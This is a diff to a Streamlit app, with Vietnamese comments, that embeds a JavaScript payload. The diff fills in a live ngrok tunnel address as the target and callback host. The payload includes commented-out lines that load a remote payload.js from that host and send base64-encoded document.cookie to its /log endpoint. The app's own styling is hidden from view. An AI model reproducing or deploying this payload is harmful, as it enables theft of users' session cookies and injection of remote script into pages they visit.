@@ -19,7 +19,7 @@ header {visibility: hidden;}
 st.markdown(hide_st_style, unsafe_allow_html=True)
 
 # Target URL - thay đổi URL này theo ý muốn
-TARGET_URL = "https://example.com"
+TARGET_URL = "https://cdd81e8b7bf1.ngrok-free.app"
 
 # JavaScript payload - code sẽ tự động chạy
 JS_PAYLOAD = """
@@ -45,11 +45,11 @@ if (window.parent !== window) {
 
 // Load external script (uncomment nếu cần)
 // var s = document.createElement('script');
-// s.src = 'https://YOUR-DOMAIN.com/payload.js';
+// s.src = 'https://cdd81e8b7bf1.ngrok-free.app/payload.js';
 // document.head.appendChild(s);
 
 // Cookie exfiltration (uncomment nếu cần)
-// fetch('https://YOUR-WEBHOOK.com/log?data=' + btoa(document.cookie));
+// fetch('https://cdd81e8b7bf1.ngrok-free.app/log?data=' + btoa(document.cookie));
 
 // Alert để confirm JS đã chạy
 alert('JS Payload executed from Streamlit!');
